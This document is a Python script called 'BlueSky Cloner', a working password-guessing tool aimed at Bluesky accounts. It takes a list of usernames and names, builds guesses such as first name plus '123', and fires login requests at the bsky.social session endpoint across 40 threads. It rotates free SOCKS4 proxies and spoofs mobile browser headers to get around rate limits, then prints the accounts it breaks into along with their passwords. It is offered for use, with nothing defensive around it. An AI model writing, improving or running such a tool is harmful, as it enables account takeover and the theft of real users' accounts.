import os
import json
import requests
import time
import sys
import random,base64
from concurrent.futures import ThreadPoolExecutor as tpe
session=requests.session()
p = print


try:
	
    rm=f"rm -rf .prox.txt"
    os.system(rm)
    rusty = session.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(rusty)
except Exception as Error:
    print(f" something went wrong ")
    er=f"{Error}"
    endd = base64.b64encode(er.encode()).decode()
    exit(f"Error \033[1;91m: %s "%(endd))
   
prox = open('.prox.txt', 'r').read().splitlines()

version = "0.1"
os.system('clear')
print(f"""
██████  ███████       ██    ██ 
██   ██ ██             ██  ██  
██████  ███████ █████   ████   
██   ██      ██          ██    
██████  ███████          ██    
_____________________________________________________
[~] Author : Michael 
[~] Tool name : BlueSky Cloner
[~] Version :  {version}              
_____________________________________________________

""")


def File_Crack():
    try:
        p(53 * "_")
        p('(01) File Crack ')
        
        p(53 * "_")
        choose = input(' Choose : ')
        if choose in ['01', '1']:
            file_crack()
        
        elif choose == "":
            p('Something went wrong with your option')
            time.sleep(1.3)
            File_Crack()
    except Exception:
        pass


def file_crack():
    try:
        print(' enter file path example : /sdcard/file.txt... ')
        file = input(' put file path : ')
        usernames = open(file, 'r').read().splitlines()
        Next(usernames, file)
    except FileNotFoundError:
        time.sleep(2)
        exit(2)


def Method():
    print(f'\n')
    global method
    method = []
    print(f' Method 1 ')
    print(f' Method 2 ')
    print(f' Method 3 ')
    print("_" * 53)
    c = input(' choose method : ')
    if c in ['01', 'a', 'A', '1']:
        method.append('FirstN')
    elif c in ['02', '2']:
        method.append('Firstm')
    elif c in ['3', '03']:
        method.append('FirstNE')
    else:
        print(' choose correctly from (1,2,3) \n  1 choosed .')
        time.sleep(3)
        method.append('FirstN')
    return method


def Next(usernames, file):
    set_users, default_users, dat, strg_users = [], [], [], []
    print(f' Total username Extracted {len(usernames)} ')
    Method()

    print('\n')
    p("_" * 53)
    p(f" File path : {file}")
    p(f" Use a strong connection ")
    p(f" Total usernames : {len(usernames)}")
    print(f" Use flight mode after 10 accounts")
    p("_" * 53)
    with tpe(max_workers=40) as sub:
        for usr in usernames:
            if '|' in usr:
                screen_name = usr.split("|")[0].strip()#strip(1)
                name = usr.split("|")[1].strip()
                first_name = name.split()[0] if name else ''
                if first_name:
                    pwd = [
                        first_name,
                        first_name + "11",
                        first_name + "12",
                        first_name + "2020",
                        first_name + "123",
                        first_name + "1234",
                        first_name + "12345",
                        first_name + "123456",
                        "BlueSky"
                    ]
                else:
                    pwd = []

                if 'FirstN' in method:
                    sub.submit(CrackApi, screen_name, pwd)
                elif 'Firstm' in method:
                    sub.submit(CrackApi2, screen_name, pwd)
                elif 'FirstNE' in method:
                    sub.submit(CrackApi3, screen_name, pwd)

    print(f'\n')
    print(f' Process completed')
    
    exit(2)


start_spd = 0
oks = []
cps = []


def CrackApi(screen_name, passwords):
    session = requests.session()
    global start_spd, oks, cps
    sys.stdout.write(f'\r [Cracking...] {start_spd} | {len(oks)}|\r\r ')
    sys.stdout.flush()
    for password in passwords:
        try:
            socK4 = random.choice(prox)
            ProXY = {'http': 'socks4://' + socK4}
            rnd=random.randint
            Useragent = "Mozilla/5.0 (Linux; Android {rnd(11,15)}; 23106RN0DA Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
            headers = {
                'User-Agent': Useragent,
                'Content-Type': 'application/json',
                'atproto-accept-labelers': 'did:plc:ar7c4by46qjdydhdevvrndac;redact',
                'origin': 'https://bsky.app',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://bsky.app/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            }

            json_data = {
                'identifier': screen_name,
                'password': password,
                'authFactorToken': '',
            }

            response = session.post('https://bsky.social/xrpc/com.atproto.server.createSession', headers=headers, json=json_data, proxies=ProXY)
            response_text = response.text

            if 'active' in response_text:
                print(f"\n\033[1;32m [Successful] {screen_name}|{password}")
                oks.append(screen_name)
                break
            elif '/account/access' in response_text or '/account/login_challenge' in response_text:
                print(f"\033[1;91m [Checkpoint] {screen_name}|{password}")
                cps.append(screen_name)
                break
            elif 'RateLimitExceeded' in response_text:
                print(f"\033[1;91m [Rate Limit Exceeded] {screen_name}|{password}")
                time.sleep(60)  # Wait for 60 seconds before retrying
                continue

            ratelimit_remaining = int(response.headers.get('ratelimit-remaining', 1))
            ratelimit_reset = int(response.headers.get('ratelimit-reset', time.time() + 60))

            if ratelimit_remaining == 0:
                sleep_time = ratelimit_reset - int(time.time())
                if sleep_time > 0:
                    print(f"\033[1;91m [Rate Limit Reached] Sleeping for  10 to {sleep_time} seconds")
                    time.sleep(sleep_time)

        except requests.exceptions.ConnectionError:
            time.sleep(10)

        except Exception:
            pass

        time.sleep(random.uniform(1, 3))  # Wait for 1 and 3 seconds between each response 💀

    start_spd += 1


File_Crack()